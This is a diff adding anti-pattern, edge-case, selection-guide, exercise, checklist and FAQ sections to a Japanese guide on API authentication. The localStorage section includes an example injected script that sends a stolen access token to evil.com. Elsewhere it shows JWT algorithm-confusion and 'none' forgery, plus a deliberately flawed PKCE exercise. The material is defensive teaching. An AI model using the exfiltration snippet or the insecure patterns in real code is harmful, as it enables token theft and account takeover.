@@ -1589,3 +1589,697 @@ server.listen(443, () => {
   console.log('mTLS server running on port 443');
 });
 ```
+
+---
+
+## 11. アンチパターン
+
+認証の実装において、よく見られる危険なパターンを解説する。
+
+### 11.1 アンチパターン1: JWTの署名アルゴリズム未検証
+
+```
+アンチパターン: alg ヘッダーを信頼する
+
+  攻撃シナリオ:
+  ┌──────────────────────────────────────────────────────────────┐
+  │                                                              │
+  │  1. 正規のJWT（RS256で署名）:                                │
+  │     Header: { "alg": "RS256", "kid": "key_01" }             │
+  │     → サーバーは秘密鍵で署名、公開鍵で検証                  │
+  │                                                              │
+  │  2. 攻撃者がalgをHS256に書き換え:                            │
+  │     Header: { "alg": "HS256" }                               │
+  │     → 公開鍵（公開情報）を共有鍵としてHS256で署名            │
+  │     → サーバーがalgヘッダーを信頼してHS256で検証             │
+  │     → 公開鍵で検証 → 成功してしまう                          │
+  │                                                              │
+  │  3. 攻撃者がalgをnoneに書き換え:                             │
+  │     Header: { "alg": "none" }                                │
+  │     → 署名なしのJWTをサーバーが受け入れてしまう              │
+  │                                                              │
+  │  影響: 任意のクレームを持つJWTを偽造可能                     │
+  │        → 管理者権限の奪取、他ユーザーへのなりすまし          │
+  └──────────────────────────────────────────────────────────────┘
+
+  対策:
+  ┌──────────────────────────────────────────────────────────────┐
+  │  [必須] 検証時にアルゴリズムをサーバー側で指定する           │
+  │  [必須] "none" アルゴリズムを拒否する                       │
+  │  [推奨] JWTライブラリを最新バージョンに保つ                 │
+  └──────────────────────────────────────────────────────────────┘
+```
+
+```javascript
+// NG: アルゴリズムを指定しない（トークンのalgヘッダーを信頼してしまう）
+const payload = jwt.verify(token, publicKey); // 危険
+
+// OK: 許可するアルゴリズムを明示的に指定
+const payload = jwt.verify(token, publicKey, {
+  algorithms: ['RS256'],  // RS256のみ許可
+});
+
+// OK: joseライブラリでの安全な検証
+const { payload } = await jwtVerify(token, JWKS, {
+  algorithms: ['RS256', 'ES256'],  // 許可リストを明示
+  issuer: 'https://auth.example.com',
+  audience: 'https://api.example.com',
+});
+```
+
+### 11.2 アンチパターン2: トークンをlocalStorageに保存
+
+```
+アンチパターン: localStorageにトークンを保存
+
+  問題:
+  ┌──────────────────────────────────────────────────────────────┐
+  │                                                              │
+  │  localStorage.setItem('access_token', token);  ← 危険       │
+  │  localStorage.setItem('refresh_token', refreshToken); ← 危険│
+  │                                                              │
+  │  XSS攻撃により、JavaScript経由でトークンが窃取される:       │
+  │                                                              │
+  │  // 攻撃者が注入するスクリプト                               │
+  │  const token = localStorage.getItem('access_token');         │
+  │  fetch('https://evil.com/steal', {                           │
+  │    method: 'POST',                                           │
+  │    body: JSON.stringify({ token }),                           │
+  │  });                                                         │
+  │                                                              │
+  │  影響:                                                       │
+  │  ・Access Tokenが盗まれ、APIに不正アクセスされる            │
+  │  ・Refresh Tokenが盗まれ、長期間のアクセスが可能になる      │
+  │  ・ユーザーのセッションが完全に乗っ取られる                 │
+  └──────────────────────────────────────────────────────────────┘
+
+  対策:
+  ┌──────────────────────────────────────────────────────────────┐
+  │  Access Token  → メモリ（JavaScript変数/クロージャ）に保持  │
+  │  Refresh Token → HttpOnly Cookieに保存                      │
+  │                                                              │
+  │  // HttpOnly Cookieの設定（サーバー側）                      │
+  │  res.cookie('refresh_token', refreshToken, {                 │
+  │    httpOnly: true,      // JavaScriptからアクセス不可        │
+  │    secure: true,        // HTTPS接続のみ                     │
+  │    sameSite: 'Strict',  // クロスサイトリクエストで送信しない │
+  │    path: '/api/auth',   // 認証エンドポイントのみ            │
+  │    maxAge: 30 * 24 * 60 * 60 * 1000, // 30日                │
+  │  });                                                         │
+  └──────────────────────────────────────────────────────────────┘
+```
+
+### 11.3 アンチパターン3: API Keyをクライアントコードに埋め込む
+
+```
+アンチパターン: フロントエンドにシークレットキーを含める
+
+  問題のあるコード例:
+  ┌──────────────────────────────────────────────────────────────┐
+  │  // React コンポーネント内                                   │
+  │  const API_KEY = 'sk_live_abc123def456';  ← シークレットキー │
+  │                                                              │
+  │  fetch('https://api.example.com/data', {                     │
+  │    headers: { 'Authorization': `Bearer ${API_KEY}` }         │
+  │  });                                                         │
+  │                                                              │
+  │  問題点:                                                     │
+  │  1. ビルド成果物（bundle.js）にキーが含まれる               │
+  │  2. ブラウザのDevToolsから容易に確認可能                     │
+  │  3. ソースコードリポジトリに含まれるリスク                   │
+  │  4. .env.local に入れても NEXT_PUBLIC_ プレフィックスで      │
+  │     クライアントに露出する                                   │
+  └──────────────────────────────────────────────────────────────┘
+
+  対策:
+  ┌──────────────────────────────────────────────────────────────┐
+  │  1. BFF（Backend for Frontend）パターンを採用               │
+  │     クライアント → BFF → 外部API                            │
+  │     シークレットキーはBFF（サーバー側）に保持                │
+  │                                                              │
+  │  2. 公開キー（pk_live_xxx）のみクライアントで使用           │
+  │     公開キーは制限されたスコープのみ許可                     │
+  │                                                              │
+  │  3. サーバーサイドプロキシ                                   │
+  │     app.get('/api/proxy/data', async (req, res) => {        │
+  │       const response = await fetch(externalUrl, {            │
+  │         headers: {                                           │
+  │           Authorization: `Bearer ${process.env.API_KEY}`     │
+  │         }                                                    │
+  │       });                                                    │
+  │       res.json(await response.json());                       │
+  │     });                                                      │
+  └──────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 12. エッジケース分析
+
+### 12.1 エッジケース1: JWTの有効期限とクロックスキュー
+
+分散システムでは、サーバー間の時刻が完全に同期されていないことがある。この時刻のずれ（クロックスキュー）はJWT検証に影響を与える。
+
+```
+クロックスキューの問題:
+
+  シナリオ:
+    認可サーバーの時刻: 12:00:00
+    リソースサーバーの時刻: 12:00:03（3秒進んでいる）
+
+    JWTの iat（発行時刻）: 12:00:00
+    JWTの exp（有効期限）: 12:15:00
+
+  問題ケース1: nbf（Not Before）
+    認可サーバー: 12:00:00 にJWT発行（nbf = 12:00:00）
+    リソースサーバー: 11:59:58（2秒遅れ）
+    → nbf > 現在時刻 → 「まだ有効期限前」として拒否される
+
+  問題ケース2: exp（Expiration）
+    Access Tokenの有効期限: あと2秒（exp = 12:15:00）
+    リソースサーバーの時刻: 12:15:01（1秒進んでいる）
+    → exp < 現在時刻 → 「期限切れ」として拒否される
+
+  対策:
+    1. clockTolerance（許容幅）を設定する
+       → 通常 15〜60秒の許容幅が適切
+       → 大きすぎると無効化したトークンが使える期間が延びる
+
+    2. NTP（Network Time Protocol）でサーバー時刻を同期する
+       → Amazon Time Sync Service、Google Public NTP等
+
+    3. Access Tokenの有効期限を十分に長くする
+       → 最低でも5分（クロックスキューの影響を緩和）
+       → ただし長すぎるとセキュリティリスクが増大
+```
+
+```javascript
+// クロックスキュー対策付きのJWT検証
+const { payload } = await jwtVerify(token, JWKS, {
+  issuer: 'https://auth.example.com',
+  audience: 'https://api.example.com',
+  algorithms: ['RS256'],
+  clockTolerance: 30,  // 30秒のクロックスキューを許容
+});
+```
+
+### 12.2 エッジケース2: 並行リフレッシュリクエスト
+
+SPAやモバイルアプリで、複数のAPIリクエストが同時にトークン期限切れを検知した場合、複数のリフレッシュリクエストが並行して送信される問題がある。
+
+```
+並行リフレッシュの問題:
+
+  時刻 T=0: Access Token期限切れ
+
+  Request A ──→ 401 Unauthorized ──→ Refresh Request A
+  Request B ──→ 401 Unauthorized ──→ Refresh Request B
+  Request C ──→ 401 Unauthorized ──→ Refresh Request C
+
+  Refresh Token Rotation有効時:
+    Refresh A → 新Token A発行、旧Refresh Token無効化
+    Refresh B → 旧Token使用 → "Token reuse detected" → 全セッション無効化
+    Refresh C → 同上
+
+  結果: ユーザーが強制ログアウトされる
+```
+
+```javascript
+// 並行リフレッシュ問題の解決: リフレッシュキュー
+class TokenManager {
+  constructor(config) {
+    this.config = config;
+    this.accessToken = null;
+    this.refreshPromise = null; // リフレッシュ中のPromiseを共有
+  }
+
+  async getAccessToken() {
+    return this.accessToken;
+  }
+
+  async refreshAccessToken() {
+    // 既にリフレッシュ中であれば、同じPromiseを返す（重複防止）
+    if (this.refreshPromise) {
+      return this.refreshPromise;
+    }
+
+    this.refreshPromise = this._doRefresh();
+
+    try {
+      const result = await this.refreshPromise;
+      return result;
+    } finally {
+      this.refreshPromise = null; // リフレッシュ完了後にクリア
+    }
+  }
+
+  async _doRefresh() {
+    const response = await fetch(this.config.tokenEndpoint, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      credentials: 'include', // HttpOnly Cookieを送信
+      body: new URLSearchParams({
+        grant_type: 'refresh_token',
+      }),
+    });
+
+    if (!response.ok) {
+      // リフレッシュ失敗 → ログイン画面にリダイレクト
+      this.accessToken = null;
+      throw new Error('Token refresh failed');
+    }
+
+    const data = await response.json();
+    this.accessToken = data.access_token;
+    return data;
+  }
+
+  // 自動リトライ付きfetch
+  async authenticatedFetch(url, options = {}) {
+    let response = await fetch(url, {
+      ...options,
+      headers: {
+        ...options.headers,
+        Authorization: `Bearer ${this.accessToken}`,
+      },
+    });
+
+    if (response.status === 401) {
+      // トークンをリフレッシュしてリトライ
+      await this.refreshAccessToken();
+      response = await fetch(url, {
+        ...options,
+        headers: {
+          ...options.headers,
+          Authorization: `Bearer ${this.accessToken}`,
+        },
+      });
+    }
+
+    return response;
+  }
+}
+
+// 使用例
+const tokenManager = new TokenManager({
+  tokenEndpoint: 'https://auth.example.com/oauth/token',
+});
+
+// 並行リクエストでもリフレッシュは1回だけ
+const [users, orders, billing] = await Promise.all([
+  tokenManager.authenticatedFetch('/api/v1/users'),
+  tokenManager.authenticatedFetch('/api/v1/orders'),
+  tokenManager.authenticatedFetch('/api/v1/billing'),
+]);
+```
+
+### 12.3 エッジケース3: マイクロサービス間のトークン伝播
+
+マイクロサービスアーキテクチャでは、受信したトークンを下流のサービスにどのように伝播するかが課題となる。
+
+```
+トークン伝播の課題:
+
+  クライアント → API Gateway → Service A → Service B → Service C
+                    │              │           │           │
+                    │  Token(user) │  ???       │  ???      │
+                    │              │           │           │
+
+  パターン1: トークンの転送（Token Forwarding）
+    受信したユーザートークンをそのまま下流に渡す
+    ・利点: シンプル、ユーザーコンテキストが保持される
+    ・欠点: 全サービスが同じaudience、スコープが広すぎる
+
+  パターン2: トークン交換（Token Exchange / RFC 8693）
+    受信トークンを新しいトークンに交換して下流に渡す
+    ・利点: サービスごとに最小限のスコープ
+    ・欠点: 認可サーバーへの追加リクエストが発生
+
+  パターン3: 内部トークン + 外部トークン
+    外部: ユーザー向けのOpaque/JWTトークン
+    内部: サービス間通信用の別トークン
+    ・利点: 内部と外部の関心事を分離
+    ・欠点: 複雑性が増す
+
+  推奨アプローチ:
+    API Gateway でユーザートークンを検証
+    → 内部リクエストヘッダーに認証済みコンテキストを設定
+    → 下流サービスはGatewayからの内部ヘッダーを信頼
+
+    X-User-Id: user_123
+    X-User-Scopes: users:read orders:read
+    X-Request-Id: req_abc123
+```
+
+---
+
+## 13. 認証方式の選定ガイド
+
+### 13.1 意思決定フローチャート
+
+```
+認証方式の選定フロー:
+
+  API の利用者は？
+  │
+  ├─ サードパーティ開発者
+  │   │
+  │   ├─ ユーザーデータにアクセス？
+  │   │   ├─ はい → OAuth 2.0 Authorization Code Flow
+  │   │   │         + PKCE（SPAの場合）
+  │   │   │
+  │   │   └─ いいえ（サーバー間のみ）
+  │   │       └─ OAuth 2.0 Client Credentials Flow
+  │   │
+  │   └─ 公開データのみ？
+  │       └─ API Key（レート制限用）
+  │
+  ├─ 自社のWebアプリ（SPA）
+  │   └─ OAuth 2.0 Authorization Code + PKCE
+  │       Access Token: メモリ
+  │       Refresh Token: HttpOnly Cookie
+  │
+  ├─ 自社のモバイルアプリ
+  │   └─ OAuth 2.0 Authorization Code + PKCE
+  │       Access Token: メモリ
+  │       Refresh Token: Keychain / Keystore
+  │
+  ├─ 自社のサーバー間通信
+  │   │
+  │   ├─ 高セキュリティ要件（金融/医療）？
+  │   │   └─ mTLS + OAuth 2.0 Client Credentials
+  │   │
+  │   └─ 通常の内部API？
+  │       └─ API Key or OAuth 2.0 Client Credentials
+  │
+  └─ 開発/テスト環境
+      └─ Basic認証 or API Key（テスト用）
+```
+
+### 13.2 アプリケーション種別ごとの推奨構成
+
+```
+アプリケーション種別ごとの推奨認証構成:
+
+  ┌─────────────────────────────────────────────────────────────────┐
+  │ アプリ種別         認証方式               トークン保存          │
+  ├─────────────────────────────────────────────────────────────────┤
+  │ SPA（React等）    OAuth2 + PKCE         メモリ + HttpOnly Cookie│
+  │ SSR Webアプリ     OAuth2 Auth Code      セッション（サーバー側）│
+  │ モバイル（iOS）   OAuth2 + PKCE         メモリ + Keychain      │
+  │ モバイル（Android）OAuth2 + PKCE        メモリ + Keystore      │
+  │ CLI ツール        OAuth2 Device Flow    ファイル（暗号化）      │
+  │ マイクロサービス  JWT + mTLS            メモリ（短命）         │
+  │ バッチ処理        Client Credentials    メモリ（実行時取得）   │
+  │ IoT デバイス      mTLS + JWT            セキュアエレメント     │
+  │ サードパーティ    OAuth2 Auth Code      サーバーセッション     │
+  │ 内部管理ツール    API Key               環境変数               │
+  └─────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 14. 演習
+
+### 14.1 演習1: 基礎 -- Basic認証からBearer Tokenへの移行
+
+以下のBasic認証を使用したAPIクライアントを、Bearer Token方式に書き換えよ。
+
+```javascript
+// 課題: このBasic認証クライアントをBearer Token方式に変更せよ
+class ApiClient {
+  constructor(username, password) {
+    this.credentials = btoa(`${username}:${password}`);
+  }
+
+  async getUsers() {
+    const response = await fetch('https://api.example.com/v1/users', {
+      headers: {
+        'Authorization': `Basic ${this.credentials}`,
+      },
+    });
+    return response.json();
+  }
+}
+
+// 要件:
+// 1. コンストラクタでトークンエンドポイントのURLを受け取る
+// 2. client_id と client_secret を使って Client Credentials Flow で
+//    Access Token を取得するメソッドを実装する
+// 3. トークンの有効期限管理（期限切れ前に自動更新）を実装する
+// 4. APIリクエスト時に Bearer Token を使用する
+```
+
+**模範解答のポイント**:
+- トークン取得メソッドでは `grant_type=client_credentials` を使用
+- `expiresAt` を管理し、期限切れ5分前に自動更新
+- `authenticatedFetch` メソッドでBearer ヘッダーを自動付与
+- エラー時のリトライロジックを含める
+
+### 14.2 演習2: 中級 -- PKCE実装の完成
+
+以下のPKCE実装には3つのセキュリティ上の問題がある。それぞれ特定し、修正せよ。
+
+```javascript
+// 課題: 以下のコードの3つのセキュリティ問題を特定し修正せよ
+class OAuthPKCE {
+  generateCodeVerifier() {
+    // 問題1: Math.randomは暗号学的に安全ではない
+    return Math.random().toString(36).substring(2, 15);
+  }
+
+  async generateCodeChallenge(verifier) {
+    // 問題2: code_challenge_method が plain（SHA-256を使うべき）
+    return verifier;
+  }
+
+  async startAuth() {
+    const verifier = this.generateCodeVerifier();
+    const challenge = await this.generateCodeChallenge(verifier);
+
+    // 問題3: localStorageはXSS脆弱（sessionStorageを使うべき）
+    localStorage.setItem('code_verifier', verifier);
+
+    const params = new URLSearchParams({
+      response_type: 'code',
+      client_id: this.clientId,
+      redirect_uri: this.redirectUri,
+      code_challenge: challenge,
+      code_challenge_method: 'plain',
+    });
+
+    window.location.href = `${this.authEndpoint}?${params}`;
+  }
+}
+
+// 修正要件:
+// 1. crypto.getRandomValues を使用した安全なランダム生成
+// 2. SHA-256 + Base64URL エンコードで code_challenge を生成
+// 3. sessionStorage を使用（またはメモリ内クロージャ）
+// 4. code_challenge_method を 'S256' に変更
+```
+
+**模範解答のポイント**:
+- `crypto.getRandomValues(new Uint8Array(32))` でランダム生成
+- `crypto.subtle.digest('SHA-256', data)` でハッシュ化
+- Base64URLエンコード（`+` を `-`、`/` を `_`、`=` を除去）
+- `sessionStorage` または変数への保存に変更
+
+### 14.3 演習3: 上級 -- マルチテナント対応JWT認証システム
+
+以下の要件を満たすJWT認証ミドルウェアを設計・実装せよ。
+
+```
+要件:
+1. マルチテナント対応（テナントごとに異なるJWKSエンドポイント）
+2. テナント識別はJWTのissクレームから行う
+3. 許可されたissuerのホワイトリストを管理する
+4. テナントごとのレート制限を実装する
+5. JWTの検証失敗時に詳細なエラーレスポンスを返す
+6. JWKSキャッシュを実装し、パフォーマンスを最適化する
+
+設計のヒント:
+  - issuerからJWKSエンドポイントを動的に解決する
+    例: "https://tenant-a.auth.example.com"
+        → "https://tenant-a.auth.example.com/.well-known/jwks.json"
+  - JWKSクライアントをテナントごとにキャッシュする
+  - テナントのホワイトリストはデータベースで管理する
+  - レート制限はRedisベースのスライディングウィンドウで実装する
+```
+
+```javascript
+// 演習の骨格コード
+class MultiTenantJwtAuth {
+  constructor() {
+    this.jwksClients = new Map(); // テナントごとのJWKSクライアントキャッシュ
+    this.allowedIssuers = new Set(); // 許可されたissuerのセット
+  }
+
+  // TODO: 以下のメソッドを実装せよ
+
+  async loadAllowedIssuers() {
+    // データベースから許可されたissuerを読み込む
+  }
+
+  getJwksClient(issuer) {
+    // issuerに対応するJWKSクライアントを取得（キャッシュ付き）
+  }
+
+  async verifyToken(token) {
+    // 1. JWTをデコード（検証前）してissuerを取得
+    // 2. issuerがホワイトリストに含まれるか確認
+    // 3. issuerに対応するJWKSクライアントで検証
+    // 4. 検証済みペイロードを返す
+  }
+
+  middleware() {
+    // Express.jsミドルウェアを返す
+    return async (req, res, next) => {
+      // 認証処理
+    };
+  }
+}
+```
+
+**模範解答のポイント**:
+- `jose` ライブラリの `decodeJwt` で検証前にissuerを取得
+- `createRemoteJWKSet` をテナントごとにキャッシュ
+- ホワイトリストの定期リロード（5分間隔など）
+- `Map` のサイズ制限（メモリリーク防止）
+
+---
+
+## 15. 認証パターンの組み合わせ
+
+実際のプロダクション環境では、単一の認証方式ではなく、複数の方式を組み合わせて使用することが多い。
+
+```
+認証パターンの組み合わせ例:
+
+  例1: ECサイトのAPI
+  ┌─────────────────────────────────────────────────────────┐
+  │ 外部向け: OAuth 2.0（サードパーティ連携）               │
+  │ SPA:     OAuth 2.0 + PKCE（フロントエンド）            │
+  │ 内部:    mTLS + JWT（マイクロサービス間）               │
+  │ 管理:    API Key + IP制限（管理ツール）                 │
+  │ 監視:    Basic認証（Prometheus等の監視ツール）          │
+  └─────────────────────────────────────────────────────────┘
+
+  例2: 金融API
+  ┌─────────────────────────────────────────────────────────┐
+  │ 顧客向け: OAuth 2.0 + PKCE + MFA（モバイルバンキング）  │
+  │ パートナー: mTLS + OAuth 2.0 Client Credentials        │
+  │ 内部: mTLS + JWT + IP制限                              │
+  │ 全通信: TLS 1.3必須、証明書ピンニング                  │
+  └─────────────────────────────────────────────────────────┘
+
+  例3: SaaS プラットフォーム
+  ┌─────────────────────────────────────────────────────────┐
+  │ ダッシュボード: OAuth 2.0 + PKCE（SPA）                │
+  │ パブリックAPI: API Key + OAuth 2.0                     │
+  │ Webhook: HMAC署名検証                                  │
+  │ CLI: OAuth 2.0 Device Code Flow                        │
+  │ 内部: JWT + サービスメッシュ（Istio等）                 │
+  └─────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 16. セキュリティチェックリスト
+
+認証実装時に確認すべき項目を以下にまとめる。
+
+```
+認証セキュリティチェックリスト:
+
+  [通信]
+  [ ] 全APIエンドポイントでHTTPSを強制している
+  [ ] HSTS（HTTP Strict Transport Security）を設定している
+  [ ] TLS 1.2以上を要求している（TLS 1.0/1.1は無効化）
+  [ ] 証明書の有効期限を監視している
+
+  [トークン管理]
+  [ ] Access Tokenの有効期限は短い（15分〜1時間）
+  [ ] Refresh Tokenは1回使用で無効化（Rotation）している
+  [ ] トークン無効化（Revocation）のエンドポイントを提供している
+  [ ] JWTの署名アルゴリズムをサーバー側で指定している
+  [ ] "alg": "none" を拒否している
+  [ ] JWTのissuer、audience、expirationを全て検証している
+
+  [認証情報の保護]
+  [ ] API Keyはハッシュ化して保存している（平文保存していない）
+  [ ] シークレットはクライアントコードに含まれていない
+  [ ] トークンをlocalStorageに保存していない
+  [ ] URLクエリパラメータで認証情報を送信していない
+  [ ] ログに認証情報が出力されていない
+
+  [攻撃対策]
+  [ ] stateパラメータでCSRF攻撃を防止している
+  [ ] PKCEを使用している（SPA/モバイル）
+  [ ] タイミング攻撃を防ぐ定数時間比較を使用している
+  [ ] ブルートフォース攻撃対策（レート制限、アカウントロック）
+  [ ] Refresh Token reuseを検知し、全セッションを無効化する
+
+  [運用]
+  [ ] API Keyのローテーション機能を提供している
+  [ ] 未使用のAPI Keyを自動で検出・通知している
+  [ ] 認証失敗のログを収集・監視している
+  [ ] インシデント時の全トークン無効化手順がある
+```
+
+---
+
+## まとめ
+
+| 方式 | 主な用途 | セキュリティ | 実装コスト | ステートレス |
+|------|----------|------------|----------|------------|
+| Basic認証 | 開発環境、内部ツール | 低（HTTPS必須） | 最低 | いいえ |
+| API Key | サーバー間、内部API | 中（ハッシュ保存） | 低 | はい |
+| Bearer Token | 汎用的なAPI認証 | 中 | 中 | 場合による |
+| OAuth 2.0 + PKCE | SPA、モバイル | 高 | 高 | 場合による |
+| OAuth 2.0 Client Credentials | サーバー間 | 高 | 中 | 場合による |
+| JWT | ステートレス認証 | 高（RS256推奨） | 中 | はい |
+| mTLS | 金融、医療、政府系 | 最高 | 高 | はい |
+
+認証方式の選定は、セキュリティ要件、ユーザー体験、実装コスト、運用コストのバランスに基づいて行う。単一の「最良の方式」は存在せず、アプリケーションの特性とリスクプロファイルに応じた適切な選択が求められる。
+
+---
+
+## FAQ
+
+### Q1. JWTの有効期限はどのくらいが適切か？
+
+Access Tokenは15分から1時間が一般的である。短いほどセキュリティは高くなるが、Refresh Token によるトークン更新の頻度が増え、ユーザー体験やサーバー負荷に影響する。金融系では5分以下、一般的なWebアプリケーションでは15分から30分、内部APIでは1時間が目安となる。Refresh Tokenは7日から90日が一般的で、ユーザーの再ログイン頻度とのバランスで決定する。重要なのは、Access Tokenが漏洩した場合の影響範囲を有効期限で制限するという考え方である。
+
+### Q2. OAuth 2.0でImplicit FlowではなくPKCEを使うべき理由は？
+
+Implicit Flowでは、Access Tokenがブラウザのアドレスバー（URLフラグメント）に直接返却されるため、ブラウザ履歴やRefererヘッダーを通じて漏洩するリスクがある。また、Refresh Tokenが発行されないため、トークン期限切れのたびにユーザーに再認証を求める必要がある。PKCE付きのAuthorization Code Flowでは、認可コードがフロントチャネルで渡されるものの、code_verifierがなければトークンに交換できないため、認可コードの傍受攻撃に対して安全である。さらにRefresh Tokenも発行されるため、ユーザー体験も向上する。OAuth 2.1ドラフトではImplicit Flowは削除される予定であり、新規開発では必ずPKCEを採用すべきである。
+
+### Q3. API Keyの安全な管理方法は？
+
+API Keyの安全な管理には複数のレイヤーが必要である。まず保存時にはSHA-256等のハッシュ関数でハッシュ化し、平文では保存しない。発行時のみ一度だけ平文のキーをユーザーに表示し、以降は取得不可とする。運用面では、キーごとにスコープ（権限）を制限し、レート制限を設定する。定期的なローテーション（90日ごとなど）を推奨し、グレースピリオド（旧キーが使える猶予期間）を24時間程度設けることで、切り替え時のダウンタイムを防ぐ。監視面では、未使用キーの検出、異常なアクセスパターンの検知、キーの漏洩（GitHubへのコミット等）の自動検出を実装する。GitHub Secret ScanningやAWS Secrets Managerなどの既存ツールの活用も有効である。
+
+### Q4. マイクロサービス間の認証でJWTとmTLSのどちらを選ぶべきか？
+
+両者は排他的ではなく、併用が理想的である。mTLSはトランスポート層でサービス間の相互認証を提供し、通信の暗号化と改ざん防止を保証する。JWTはアプリケーション層でユーザーコンテキスト（誰の代理でリクエストしているか）を伝播する役割を持つ。Istio等のサービスメッシュを使用する場合、mTLSはインフラ層で透過的に処理されるため、アプリケーションコードはJWTの検証に集中できる。予算や技術的制約で一方のみを選ぶ場合、ユーザーコンテキストの伝播が必要ならJWT、サービス間の強固な認証が優先ならmTLSを選択する。
+
+### Q5. OAuth 2.0のstateパラメータはなぜ必要か？
+
+stateパラメータはCSRF（Cross-Site Request Forgery）攻撃を防ぐために不可欠である。stateパラメータがない場合、攻撃者は自身のアカウントの認可コードを被害者のブラウザに送り込み、被害者のセッションを攻撃者のアカウントに紐付けることができる。これにより、被害者が入力した情報（クレジットカード番号等）が攻撃者のアカウントに保存されるといった攻撃が成立する。stateパラメータとして暗号学的に安全なランダム値をセッションに保存し、コールバック時に一致を確認することで、この攻撃を防止できる。OAuth 2.0の仕様では推奨（SHOULD）であるが、事実上必須として扱うべきである。
+
+---
+
+## 次に読むべきガイド
+→ [[01-rate-limiting.md]] -- レート制限
+
+---
+
+## 参考文献
+1. RFC 6749. "The OAuth 2.0 Authorization Framework." IETF, 2012.
+2. RFC 6750. "The OAuth 2.0 Authorization Framework: Bearer Token Usage." IETF, 2012.
+3. RFC 7519. "JSON Web Token (JWT)." IETF, 2015.
+4. RFC 7617. "The 'Basic' HTTP Authentication Scheme." IETF, 2015.
+5. RFC 7636. "Proof Key for Code Exchange by OAuth Public Clients (PKCE)." IETF, 2015.
+6. RFC 8693. "OAuth 2.0 Token Exchange." IETF, 2020.
+7. Auth0. "OAuth 2.0 Best Current Practice." auth0.com.
+8. OWASP. "Authentication Cheat Sheet." owasp.org.
